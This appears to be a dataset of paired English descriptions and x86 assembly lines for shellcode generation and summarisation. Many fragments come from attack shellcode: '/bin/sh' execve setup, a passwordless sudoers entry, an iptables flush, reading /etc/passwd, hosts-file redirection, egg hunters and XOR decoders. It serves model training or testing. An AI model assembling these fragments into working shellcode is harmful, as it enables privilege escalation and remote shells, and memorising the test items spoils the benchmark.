ShellCodeGen: push the word 0x5c11 to the stack,push word 0x5c11
"ShellCodeSum: test ax, ax \n jnz exeunt \n jmp carryon",if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
ShellCodeGen: execute the reboot syscall,int 0x80
ShellCodeSum: call internetreadfile,call function internetreadfile
ShellCodeSum: file: db '/sbin/iptables#-f',define file as the byte string '/sbin/iptables#-f'
"ShellCodeSum: cmp bl, 78h \n jl short loc_402B1D",if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
ShellCodeSum: inc dword [tmp],add one to the doubleword integer stored at memory location tmp
ShellCodeGen: move name into ebx,"mov ebx, name"
"ShellCodeSum: mov ecx, donemsg",move donemsg into ecx
ShellCodeGen: push the value 0x6374652f onto the stack and point edx to the stack register,"push 0x6374652f \n mov edx, esp"
"ShellCodeSum: cmp eax, ebx \n je all",if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
ShellCodeGen: allocate memory for a null terminated string 'hello\n',"message db 'hello',13,0"
ShellCodeGen: call the execute function,call execute
"ShellCodeSum: and mask1, 128",perform and operation on the variable mask1 and 128
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point ecx to the stack register,"push 0x2f2f2f2f \n mov ecx, esp"
ShellCodeGen: subtract the contents of eax from the contents of eax,"sub eax, eax"
ShellCodeGen: move ebp into edx,"mov edx, ebp"
ShellCodeGen: jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero,"cmp [ebp+var_a], 0 \n jnz short loc_4010E5"
"ShellCodeSum: mov ax, [my_var]",copy my_var contents in ax
ShellCodeGen: push the 0x6374652f onto the stack,push 0x6374652f
ShellCodeGen: subtract 0x7 from the contents in bl and save the result in bl,"sub bl, 0x7"
"ShellCodeSum: add byte [var], 30",add 30 to the single byte stored at memory address var
"ShellCodeSum: mov esi, 0x65636170",move 0x65636170 into esi
ShellCodeSum: _start:,define the _start label
ShellCodeGen: move b to ecx,"mov ecx, b"
ShellCodeGen: compare ecx and ebp,"cmp ecx, ebp"
"ShellCodeSum: xchg edx, eax",swap the values of edx and eax registers
ShellCodeGen: define string as the byte string 'file1.txt',string: db 'file1.txt'
ShellCodeSum: push byte 0x3f,push the byte 0x3f onto the stack
ShellCodeSum: push 0x2f6e6962,push 0x2f6e6962 onto the stack
"ShellCodeSum: mov esi, eax",move eax into esi
ShellCodeSum: retry:,declare retry label
ShellCodeGen: right shift the contents of the ebx register by the contents of the cl register,"shr ebx, cl"
ShellCodeSum: pop eax,restore the top of the stack into eax register
ShellCodeGen: add ebx to ecx,"add ecx, ebx"
ShellCodeGen: move 0x776f into the word in [esp+0x1],"mov word [esp+0x1], 0x776f"
ShellCodeGen: move the byte at the address [esi+ecx+1] into bl,"mov bl, byte [esi+ecx+1]"
"ShellCodeSum: mov al, dl",move dl into al
ShellCodeGen: put the syscall 0x0b into the eax register,push byte 0x0b \n pop eax
ShellCodeGen: move 0ah into eax,"mov eax, 0ah"
ShellCodeGen: push 0x782f6e69 onto the stack,push 0x782f6e69
ShellCodeGen: push 0x3458652e onto the stack,push 0x3458652e
ShellCodeGen: move 0x01 into bl,"mov bl, 0x01"
"ShellCodeSum: mov bx, word_value",move memory word_value to register bx
ShellCodeGen: jump to the label check_html if the contents of the eax register is zero,"test eax, eax \n jz check_html"
"ShellCodeSum: cmp bl, 78h \n jge short loc_402B1D",if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
ShellCodeGen: perform xor operation between ebx register and the word __flag_byte and save the result in ebx,"xor [ebx], word __flag_byte"
ShellCodeSum: _continue:,define the _continue label
ShellCodeSum: push 0x69622f65,push 0x69622f65 onto the stack
"ShellCodeSum: mov ecx, hello",put the offset of hello in ecx
ShellCodeSum: push dword 0x45525649,push the dword 0x45525649 onto the stack
ShellCodeGen: push the word 0x2 to the stack,push word 0x2
ShellCodeGen: subtract the byte at the address esi from the contents of the dl register,"sub dl, byte [esi]"
"ShellCodeSum: mov eax, [y]",move the contents at memory specified by y to eax
ShellCodeGen: jump to retry if not equal,jne retry
ShellCodeGen: move esi into the address [esi+35],"mov [esi+35], esi"
"ShellCodeSum: mov eax, 3",make the system call read
ShellCodeGen: jump to 804809a if not equal,jne 804809a
"ShellCodeSum: mov esi, 10",move 10 into esi
ShellCodeGen: jump short to the .exit label,jmp short .exit
"ShellCodeGen: define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d","db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d"
ShellCodeGen: call the _build function,call _build
ShellCodeGen: put the syscall 28 into the eax register,push byte 28 \n pop eax
ShellCodeGen: define message as the byte string '/bin/sh',message db '/bin/sh'
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register,"mov ebx, [ebp-8]"
ShellCodeSum: main:,declare the main label
ShellCodeGen: subtract the byte value 3 from the contents of ebx and save the result in ebx,"sub ebx, byte 3"
ShellCodeSum: push dword [edx+2],push the doubleword [edx+2] to the stack
"ShellCodeSum: shl ebx, 2",multiply ebx by 4 using left shift
ShellCodeGen: subtract the contents of the dx register from the contents of the bx register,"sub bx, dx"
"ShellCodeSum: mov ecx, 0x1",move 0x1 into ecx
ShellCodeGen: move the contents of al into the byte at the memory location specified by the operation [esi+14],"mov byte [esi+14],al"
ShellCodeGen: add 0x25 to the al register,"add al, 0x25"
ShellCodeSum: push byte 0x06,push the byte 0x06 onto the stack
ShellCodeSum: push word 0x5445,push the word 0x5445 onto the stack
ShellCodeGen: subtract 12 from esp register and save the result in esp,"sub esp, 12"
ShellCodeSum: push 0x61622f2f,push 0x61622f2f onto the stack
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov ebx, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
ShellCodeSum: loop decrypt \n jmp encrypt,decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
ShellCodeSum: pop si,restore the top of the stack into the si register
ShellCodeSum: jmp short shellcode,jump short to the shellcode label
"ShellCodeSum: mov dx, 1222",move 1222 into dx
ShellCodeGen: define the byte 0xcd,db 0xcd
ShellCodeGen: move the byte in esi+ecx+1 into bl,"mov bl, byte [esi+ecx+1]"
"ShellCodeSum: mov bl, 10",move 10 into bl
ShellCodeGen: load the effective address of the result of the operation [ebp+39] into the ebx register,"lea ebx, [ebp+39]"
ShellCodeGen: push the value 0x6374652f onto the stack and point edi to the stack register,"push 0x6374652f \n mov edi, esp"
"ShellCodeSum: mov ebx, [x]",move the contents at memory address x to ebx
ShellCodeGen: move 0x35 into dh,"mov dh, 0x35"
"ShellCodeSum: mov eax, 3",read
ShellCodeGen: load the effective address of the operation [bp+di+0x32] into the cx register,"lea cx, [bp+di+0x32]"
"ShellCodeSum: sub al, ah",subtract ah from al
ShellCodeGen: push the word 0x02 onto the stack,push word 0x02
"ShellCodeSum: mov ecx, msg",move the address of message string into ecx
ShellCodeGen: declare one label,one:
ShellCodeSum: loop main_inc,decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
ShellCodeGen: push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register,"push 0x61702f2f \n push 0x6374652f \n mov edi, esp"
ShellCodeGen: save the old base pointer value,push ebp
ShellCodeGen: test the value of cl,"test cl, cl"
ShellCodeGen: move dword 0x65676760 into edx,"mov edx, dword 0x65676760"
"ShellCodeSum: mov al, 0x01",move 0x1 into lower byte of the eax register
ShellCodeSum: cdq,extend the sign bit of eax register into the edx register
ShellCodeSum: jmp short stage,jump short to the stage label
"ShellCodeSum: mov eax, 7",wait for child to terminate
ShellCodeGen: define the _socket label,_socket:
ShellCodeSum: push 0x30313a31,push 0x30313a31 to the stack
"ShellCodeSum: sub ebx, byte 3",subtract the byte value 3 from the contents of ebx and save the result in ebx
ShellCodeGen: move 99 into al,"mov al, 99"
"ShellCodeSum: mov eax, [ebp+8]",move value of memory address [ebp+8] into eax
ShellCodeGen: push 0x6e7a762d onto the stack,push 0x6e7a762d
ShellCodeSum: db 'egg mark',define the byte string 'egg mark'
ShellCodeGen: divide eax by ecx,div ecx
ShellCodeGen: define the byte string 'all all=(all) nopasswd: all',"db 'all all=(all) nopasswd: all', 0xa"
ShellCodeGen: add 0x66 to the contents in al and save the result in al,"add al, 0x66"
"ShellCodeSum: cmp cl, dl \n jb l3",jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
ShellCodeSum: push 10,push 10 onto the stack
ShellCodeSum: push 0x7374736f,push 0x7374736f onto the stack
ShellCodeSum: 1:,define the label 1
ShellCodeGen: if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jle short loc_402B1D"
ShellCodeGen: move the value 0x4 onto the stack,"mov bl, 0x4"
ShellCodeGen: jump to the encoded label if the zero flag is set,jz encoded
ShellCodeGen: move 1 into al,"mov al, 1"
"ShellCodeSum: sub edi, 0xffffffdf",subtract 0xffffffdf from edi
ShellCodeSum: scasd \ jnz _end \n jmp edi,jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
ShellCodeSum: push byte 8 \n pop eax,put the syscall 8 into the eax register
ShellCodeGen: add 4 to esi,"add esi, 4"
ShellCodeGen: swap the values of esi and eax,"xchg esi, eax"
ShellCodeGen: decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register,"loop l4 \n mov edx, esp"
"ShellCodeSum: push edx \n mov ebx, esp",push the contents of the edx register onto the stack and point ebx to the stack register
"ShellCodeSum: push word 0x662d \n mov edx, esp",push the word 0x662d onto the stack and point the edx register to the stack register
ShellCodeSum: db 'my.txtx',define the byte string 'my.txtx'
ShellCodeGen: push 0x746f6f72 onto the stack,push 0x746f6f72
ShellCodeGen: move 0x3734b117 into edi,"mov edi, 0x3734b117"
ShellCodeSum: jmp short get,jump short to the get label
"ShellCodeSum: mov ebx, esi",move esi into ebx
ShellCodeSum: push 102,push 102 onto the stack
ShellCodeSum: jmp eax,jump to the value stored in the eax register
ShellCodeSum: call cont,call the cont function
ShellCodeGen: push the dword 0x64616568 onto the stack,push dword 0x64616568
ShellCodeSum: push word 0x6d6f,push the word 0x6d6f onto the stack
"ShellCodeSum: mov dword [esp-8], edi",move edi into the doubleword starting at the address esp-8
ShellCodeGen: move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register,"mov ecx, [ebp+12]"
ShellCodeGen: move the memory address of our file contents variable into ecx,"mov ecx, filecontents"
ShellCodeGen: system call fork,"mov eax, 2"
ShellCodeGen: push the word 1 onto the stack and point eax to the stack register,"push word 1 \n mov eax, esp"
"ShellCodeSum: cmp dword [eax-8], egg",compare the dword at the address [eax-8] and egg
ShellCodeGen: push the contents of the esi register onto the stack and point edx to the stack register,"push esi \n mov edx, esp"
ShellCodeGen: push ecx on the stack,push ecx
ShellCodeGen: decrement eax,dec eax
ShellCodeGen: define call_decoder function,call_decoder:
"ShellCodeSum: mov ebx, 1",write to the stdout file
ShellCodeSum: loop eggLoop \n jmp edi,decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
"ShellCodeSum: lea edx, [esi+30]",load the effective address of the result of the operation [esi+30] into the edx register
ShellCodeSum: int 80h,make the syscall to terminate the program
ShellCodeSum: push 0x37373333,push 0x37373333 onto the stack
ShellCodeGen: push the dword 0x6f702f6e onto the stack,push dword 0x6f702f6e
ShellCodeGen: load the effective address [ebp+28] into ecx,"lea ecx, [ebp+28]"
ShellCodeSum: dec cl,decrement the contents of the cl register
"ShellCodeSum: test eax, eax \n jnz exit_on_error",jump to the label exit_on_error if the contents of the eax register is not zero
ShellCodeGen: if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label,"cmp bl, 0xbb \n je xordecode \n jmp notdecode"
"ShellCodeSum: mov al, 0x58",load the syscall value 0x58 for reboot in the al register
ShellCodeSum: js error,jump to error label if sign flag SF is equal to 1
"ShellCodeSum: xor bl, 0xBB \n jz encoded",jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero
"ShellCodeSum: test dl, 0x1 \n jnz ready_to_proxy",jump to the label ready_to_proxy if the contents of the dl register is not zero
ShellCodeGen: push the value 0x64687373 onto the stack and point the esi register to the stack register,"push 0x64687373 \n mov esi, esp"
"ShellCodeSum: shr eax, 2",divide eax by 4 using right shift
ShellCodeGen: jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register,"cmp edx, ebx \n je 0x8 \n mov ebx, edx"
ShellCodeGen: load the effective address [zero_reg+3] into ebx,"lea ebx, [zero_reg+3]"
ShellCodeSum: push word 0x1b6,push the word 0x1b6 to the stack
"ShellCodeSum: add dx, 0x2f2f",add 0x2f2f to the contents in dx and save the result in dx
ShellCodeGen: negate all the bits of the ecx register,not ecx
ShellCodeGen: push 0x10 to the stack,push 0x10
"ShellCodeSum: sub bx, bx",subtract the contents of bx from the contents of bx
ShellCodeSum: pushl $0x6e69622f,push $0x6e69622f onto the stack
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register,"cmp eax, ebx \n je all \n xor eax, eax"
ShellCodeGen: decrease ecx by 1,"sub ecx, 1"
ShellCodeGen: define here label,here:
"ShellCodeSum: cmp eax, ebx \n je exit \n add al, 0x3",jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
ShellCodeSum: call _malloc,call _malloc
"ShellCodeSum: mov eax, 19",make the system call to go to the file offset
ShellCodeGen: subtract 5e5d7722 from the contents of the eax register,"sub eax, 5e5d7722"
ShellCodeGen: define the _setsockopt label,_setsockopt:
"ShellCodeSum: and eax, 0fh",clear all but the last 4 bits of eax
ShellCodeGen: section for initialized data,section .data
ShellCodeSum: jmp short three,jump short to the three label
ShellCodeGen: jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register,"cmp al, bl \n jb l2"
ShellCodeGen: jump to 80480aa if not equal,jne 80480aa
ShellCodeGen: restore esi from the stack,pop esi
ShellCodeSum: push word 0x0a,push the word 0x0a onto the stack
"ShellCodeSum: mov [esi+47], eax",move eax into the address [esi+47]
ShellCodeGen: compare the contents of bl and 0x1f,"cmp bl, 0x1f"
ShellCodeGen: define the call_decoded label,call_decoded:
"ShellCodeSum: add eax, 24",add 24 to eax
ShellCodeGen: push 0x30313a31 onto the stack,push 0x30313a31
ShellCodeGen: decrement the contents of cl,dec cl
ShellCodeGen: jump to loc_402B13 if the contents of the edx register is equal to 42,"cmp edx, 42 \n je short loc_402B13"
ShellCodeSum: section .data,declare section containing initialized data
ShellCodeSum: re,define label re
ShellCodeSum: cmd: db 'cat /etc/passwd',define cmd as the byte string 'cat /etc/passwd'
ShellCodeSum: push word 0x692d,push the word 0x692d onto the stack
ShellCodeSum: push ebp,push the ebp onto the stack
"ShellCodeSum: sar eax, 23",right shift the contents of eax by 23 bits
ShellCodeGen: jump to the label close if the contents of the eax register is zero,"test eax, eax \n jz close"
ShellCodeSum: push 0x742f2f2f,push 0x742f2f2f onto the stack
ShellCodeGen: move 5 into eax,"mov eax, 0x5"
ShellCodeSum: _cmd:,define the _cmd label
ShellCodeSum: loopnz next,decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
ShellCodeSum: push ebx,push ebx to the stack
ShellCodeSum: je continue,jump to label continue if equal
"ShellCodeSum: cmp ecx, 5",compare ecx with 5
ShellCodeSum: push dword 0x656e7265,push the dword 0x656e7265 onto the stack
ShellCodeSum: push 0x682f2f2f,push the 0x682f2f2f value onto the stack
ShellCodeGen: move 0x343997b7 into edi,"mov edi, 0x343997b7"
ShellCodeSum: formatting:,define formatting label
ShellCodeGen: push the dword 0x69622f3a onto the stack,push dword 0x69622f3a
"ShellCodeSum: mov dx, 0x2a1",move the value 0x2a1 into the dx register
ShellCodeGen: push double word 0x39396e2d onto the stack and point the ebx register to the stack register,"push dword 0x39396e2d \n mov ebx, esp"
ShellCodeSum: push 0x6168732f,push 0x6168732f to the stack
"ShellCodeSum: push word 0x662d \n mov eax, esp",push the word 0x662d onto the stack and point the eax register to the stack register
ShellCodeSum: arr dd 100,define the doubleword arr and initialize it to 100
ShellCodeSum: push 0x0,push the value 0x0 to the stack
"ShellCodeSum: cmp cl, 12 \n jg l2",if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
ShellCodeGen: jump short to the three label,jmp short three
ShellCodeGen: push ecx onto the stack,push ecx
"ShellCodeSum: mov byte al, 11",move 11 into the byte at address al
"ShellCodeSum: mov al, 0x3f",syscall 63
ShellCodeGen: move 04h into al,"mov al, 04h"
ShellCodeGen: make the system call exit,"mov eax, 1"
ShellCodeGen: jump to 0x41 if not zero,jnz 0x41
ShellCodeSum: push 0x2e323931,push 0x2e323931 onto the stack
ShellCodeSum: callme:,define the callme label
"ShellCodeSum: cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40",jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
ShellCodeGen: perform a logical xor between the ebx register and the ebp register and save the result in ebx,"xor ebx, ebp"
"ShellCodeSum: mov dword [esp-12], 0x6374652f",move 0x6374652f into the dword at the memory location [esp-12]
ShellCodeSum: push 0x1,push 0x1 onto the stack
ShellCodeSum: not word ax,negate all the bits of the word at the address ax
ShellCodeGen: jump to the wrap_around label if the destination operand is less than the source operand in the above comparison,jl wrap_around
ShellCodeGen: compare if the contents of al with 0xf2,"cmp al, 0xf2"
ShellCodeGen: move 0x1a4 into dx,"mov dx, 0x1a4"
ShellCodeGen: subtract 0x44444444 from edi and save the result in edi,"sub edi, 0x44444444"
"ShellCodeSum: mov eax, [ebx+esi]",move the contents of memory address ebx+esi into eax
ShellCodeSum: push word 0x4255,push the word 0x4255 onto the stack
ShellCodeGen: reserve filecontents variable of 128 bytes,filecontents: resb 128
"ShellCodeSum: test eax, eax \n jnz exit_on_error",if the contents of the eax register is not zero then jump to the label exit_on_error
ShellCodeGen: declare the execfile label,execfile:
"ShellCodeSum: mov eax, 20",system call getpid
ShellCodeGen: jump to the label l3 if the contents of the dl register is greater than the decimal value 27,"cmp dl, 27 \n jg l3"
"ShellCodeSum: mov ebx, [my_table]",save the effective address of my_table in ebx
"ShellCodeSum: cmp ebx, 9 \n ja exit \n jmp loop",if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
ShellCodeGen: move 0x88998899 into ecx,"mov ecx, 0x88998899"
ShellCodeSum: pop eax,restore the top of the stack into the eax register
"ShellCodeSum: mov eax, 4",move 4 to the eax register
ShellCodeSum: push word 0544o,push the word 0544o onto the stack
ShellCodeGen: define google as the byte string '127.1.1.1 google.com',google db '127.1.1.1 google.com'
ShellCodeGen: call the _myfunc function,call _myfunc
ShellCodeGen: move the contents of bx into ax,"mov ax, bx"
ShellCodeGen: perform the xor operation between the al register and the value 0x4a,"xor al, 0x4a"
"ShellCodeSum: add eax, ebx",add ebx to eax and store the result in eax
"ShellCodeSum: add eax, 10",add 10 to the contents of eax
ShellCodeGen: move edi into the doubleword starting at the address esp-8,"mov dword [esp-8], edi"
ShellCodeSum: jmp encrypt,jump to the encrypt label
"ShellCodeSum: lea eax, [zero_reg+66h]",load the effective address [zero_reg+66h] into eax
ShellCodeGen: move the byte at the address 0x1 into al,"mov al, byte 0x1"
"ShellCodeSum: xor edx, edx \n push edx",push zero onto the stack
ShellCodeGen: declare code section,section .text
ShellCodeGen: declare the writestring label,writestring:
ShellCodeSum: push byte 28,push the byte 28 to the stack
ShellCodeGen: make the system call to send the signal to another process,"mov eax, 37"
"ShellCodeSum: mov [esi+43], ebx",move ebx into the address [esi+43]
"ShellCodeSum: mov [bp+0x07], al",move the contents of the al register at the memory location specified by the operation [bp+0x07]
ShellCodeGen: jump to the exit label if the zero flag is set,jz exit
"ShellCodeSum: mov bl, byte 0eh",move the byte 0eh into bl
"ShellCodeSum: mov eax, 20",make the system call to get the process ID
ShellCodeGen: move the value of ax into memory at address 1000h,"mov [1000h], ax"
ShellCodeGen: move 0x01 into al,"mov al, 0x01"
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
ShellCodeGen: subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative,"sub cl, bl \n jns l3"
ShellCodeGen: swap the values of ebx and eax registers,"xchg ebx, eax"
ShellCodeGen: perform a bitwise and of the contents of ax and the contents of ax,"test ax, ax"
"ShellCodeSum: xor eax, eax \n push eax",zero out the eax register and push zero onto the stack
ShellCodeGen: right shift the contents of the dl register by 1 bit,"shr dl, 1"
ShellCodeSum: loopnz Label1,decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
"ShellCodeSum: push byte 0x7 \n mov edx, esp",push the byte 0x7 onto the stack and point edx to the stack register
ShellCodeSum: pop edx,pop the value on the stack back into edx
ShellCodeGen: move the contents of the al register into the edi register,"mov [edi], al"
ShellCodeGen: make sys_write kernel call,int 80h
ShellCodeGen: subtract 0x7 from bl and save the result into bl,"sub bl, 0x7"
ShellCodeGen: jump short to the _start label,jmp short _start
"ShellCodeSum: mov ecx, offset array",move starting address of array to ecx
ShellCodeGen: add 30 to the single byte stored at memory address var,"add byte [var], 30"
ShellCodeSum: push 0x81e3a8c0,push 0x81e3a8c0 onto the stack
ShellCodeSum: push 0xb,push 0xb onto the stack
ShellCodeGen: define word3 uninitialized unsigned word,word3 word ?
"ShellCodeSum: loop l3 \n mov ecx, esp",decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
"ShellCodeSum: mov ebp, esp",move esp into ebp
ShellCodeGen: push the 0x4c4c4128 onto the stack,push 0x4c4c4128
"ShellCodeSum: or dx, 0xfff",perform or operation between dx and 0xfff and save the result into dx
ShellCodeSum: push word 0x0f27,push the word 0x0f27 onto the stack
ShellCodeGen: move eax into ebx,"mov ebx, eax"
"ShellCodeSum: xor ax, 0x7777",perform the xor operation between the contents of the ax register and the value 0x7777
ShellCodeSum: push 0x6168732f,push 0x6168732f onto the stack
ShellCodeSum: push edi,push the edi onto the stack
ShellCodeGen: perform the xor operation between cl and 0x32 and store the resut in cl,"xor cl, 0x32"
ShellCodeGen: push the dword 0x214c4f4c onto the stack,push dword 0x214c4f4c
"ShellCodeSum: mov eax, 0x5",move 5 into eax
ShellCodeSum: push 0x3170762d,push the 0x3170762d onto the stack
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov esi, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
"ShellCodeSum: mov dx, 132",move 132 into dx
ShellCodeGen: call the _continue function,call _continue
"ShellCodeSum: lea edi, [esi + 13]",load the effective address of the result of the operation [esi + 13] into the edi register
ShellCodeGen: push the contents of the cx register onto the stack,push cx
"ShellCodeSum: mov edi, ecx",move ecx to edi
ShellCodeSum: loopnz L1 \n jmp shellcode,decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
ShellCodeSum: loopinghere:,declare the loopinghere label
ShellCodeSum: jmp short formatting,jump short to the formatting label
ShellCodeSum: jmp short output,jump short to the output label
"ShellCodeSum: mov ecx, [esp]",move the contents of esp into ecx
"ShellCodeSum: cmp cl, 0x3 \n jne loop",if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
"ShellCodeSum: mov ecx, eatmsg",move eatmsg into ecx
ShellCodeGen: decrement the counter and jump to the do_dup label if the count is not zero,loop do_dup
ShellCodeSum: jmp short 0x34,jump short to 0x34
ShellCodeGen: define the numeric label 2,2:
ShellCodeGen: move 0xa4 into the byte at address al,"mov byte al, 0xa4"
"ShellCodeSum: mov [ebx], 123",move 123 into the effective address saved in ebx
ShellCodeGen: define the child label,child:
ShellCodeGen: decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register,loopnz next2 \n jmp edi
"ShellCodeSum: mov al, 0x7",move 0x7 into al
ShellCodeGen: allocate one byte of memory for var_b variable and initialize it to 'c',var_b db 'c'
"ShellCodeSum: mov eax, 10000h",move 10000h into eax register
ShellCodeGen: define the label 2,2:
ShellCodeGen: negate the contents of var,neg var
ShellCodeGen: move the value 0x61722f6c into the double word starting at the address [esp-0x18],"mov dword [esp-0x18], 0x61722f6c"
ShellCodeGen: push the value 0x6374652f onto the stack and point ebp to the stack register,"push 0x6374652f \n mov ebp, esp"
"ShellCodeSum: sub bl, byte [esi]",subtract 0x7 from the byte in esi register
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register,"cmp dword [eax], ebx \n jne next_addr \n jmp eax"
ShellCodeSum: push byte 1,push byte 1 onto the stack
ShellCodeGen: if not zero jump short to the _paren label,jnz short _paren
ShellCodeGen: call the _exec function,call _exec
ShellCodeSum: push 0x2e383631,push 0x2e383631 to the stack
ShellCodeGen: perform a logical xor between the eax register and the ebx register and save the result in eax,"xor eax, ebx"
ShellCodeSum: get:,declare the get label
ShellCodeGen: add the contents of the edx register to the contents of eax register,"add eax, edx"
ShellCodeGen: perform an unsigned comparison and jump to 0xf3 if lower,jb 0xf3
ShellCodeGen: extend the sign bit of eax into the edx register,cdq
ShellCodeSum: pop ecx,restore ecx from the value we pushed onto the stack at the start
"ShellCodeSum: rol edi, 1",left rotate the contents of the edi register by 1 bit
ShellCodeGen: push 0x50446862 onto the stack,push 0x50446862
ShellCodeSum: jmp begin,jump to the instruction labeled begin
ShellCodeGen: declare data section,section .data
ShellCodeSum: db 0xcd,define the byte 0xcd
ShellCodeGen: stat,"mov eax, 106"
ShellCodeGen: define the byte string google and initialize it to '127.1.1.1 google.com',google: db '127.1.1.1 google.com'
ShellCodeSum: push 0x2f6e6962,push 0x2f6e6962 to the stack
ShellCodeSum: push edi,push the contents of edi register onto the stack
ShellCodeGen: move command into ebx,"mov ebx, command"
"ShellCodeSum: push edi \n mov eax, esp",push the contents of the edi register onto the stack and point eax to the stack register
"ShellCodeSum: cmp eax, ebx \n je 0x47 \n xor ecx, ecx",if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
ShellCodeGen: perform the xor operation between dl and 0xbb and store the result in dl,"xor dl, 0xbb"
"ShellCodeSum: cmp al, 0xf2 \n je _start \n mov eax, 0x50905090",if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
ShellCodeSum: jz nomoreargs,if zero flag is set jump to nomoreargs label
ShellCodeGen: push 0x76766c2d to the stack,push 0x76766c2d
ShellCodeGen: move 13 into edx,"mov edx, 13"
ShellCodeSum: message db '/etc/passwd',define message as the byte string '/etc/passwd'
ShellCodeGen: define decode function,decode:
ShellCodeGen: jump short to the call_decoder label,jmp short call_decoder
ShellCodeGen: copy the contents of ebx into eax register,"mov eax, ebx"
ShellCodeGen: push 0x2e383631 to the stack,push 0x2e383631
ShellCodeGen: move the contents of x into ebx,"mov ebx, x"
ShellCodeGen: read,"mov eax, 3"
ShellCodeSum: neg var,negate the contents of var
ShellCodeSum: jocker:,declare the jocker label
ShellCodeGen: push 0x706d742f to the stack,push 0x706d742f
ShellCodeGen: perform a logical xor between the ecx register and the dh register and save the result in ecx,"xor ecx, dh"
ShellCodeGen: push the byte +0x3 onto the stack,push byte +0x3
ShellCodeSum: db '/bin/sh',define a byte string and initialize it to '/bin/sh'
ShellCodeGen: add 0x12345678 to the contents in eax and save the result in eax,"add eax, 0x12345678"
ShellCodeGen: call the doit function,call doit
ShellCodeGen: open the file,"mov eax, 5"
ShellCodeSum: jnz next_addr,jump to next_addr if not zero
ShellCodeGen: decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero,loop main_inc
"ShellCodeSum: cmp eax, ebp \n jnz short loc_40102B",if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
ShellCodeSum: push byte CHMOD_CALL \n pop eax,put the byte CHMOD_CALL into the eax register
ShellCodeGen: load the effective address of the result of the operation [esp +1] into the ebx register,"lea ebx, [esp +1]"
ShellCodeGen: jump to label done if equal,je done
ShellCodeGen: declare the priv_setuid label,priv_setuid:
ShellCodeSum: loop do_dup,decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
"ShellCodeSum: add eax, 48",add decimal 48 to eax
ShellCodeGen: define the _close label,_close:
ShellCodeGen: move 0x1c into dl,"mov dl, 0x1c"
ShellCodeGen: jump short to exi label,jmp short exi
ShellCodeSum: execfile:,declare the execfile label
ShellCodeGen: move al into the byte at address [esi+21],"mov byte [esi+21], al"
"ShellCodeSum: mov bl, byte [esi]",move the byte at the address [esi] into bl
ShellCodeSum: jmp short .exit,jump short to the .exit label
ShellCodeGen: push byte 0 onto stack,push byte 0
ShellCodeGen: if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jge short loc_402B1D"
ShellCodeGen: jump to fupdisasm+1,jmp fupdisasm+1
ShellCodeGen: push 0x6168732f to the stack,push 0x6168732f
ShellCodeGen: push the byte 0x1 onto the stack,push byte 0x1
ShellCodeGen: move 0xb into al,"mov al, 0xb"
ShellCodeGen: set carry flag,stc
ShellCodeGen: move ASCII /bin/sh into ebx,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: define the _user label,_user:
ShellCodeGen: push the 4 bytes at address tmp onto stack,push [tmp]
ShellCodeSum: push word 0x776f,push the word 0x776f onto the stack
"ShellCodeSum: mov [esi+35], esi",move esi into the address [esi+35]
